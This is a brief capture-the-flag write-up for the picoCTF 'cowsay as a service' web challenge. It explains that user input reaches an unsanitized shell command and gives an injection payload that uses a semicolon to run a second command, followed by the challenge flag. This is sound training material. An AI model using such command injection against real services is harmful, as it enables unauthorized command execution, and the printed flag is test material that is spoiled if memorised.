# caas - picoMini by redpwn (web)
### Description
Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)

Download [index.js](https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js)

<details>
<summary>Solution</summary>
When looking at index.js we can see that our message is included into an unsanitized commandline. 
We can break out and execute anything we want by using a `;` then we can cat the flag `cat falg.txt`
Here the flag is called `falg.txt` for some reason. 
Final payload: `alune;cat falg.txt`
Final flag: `picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`
</details>
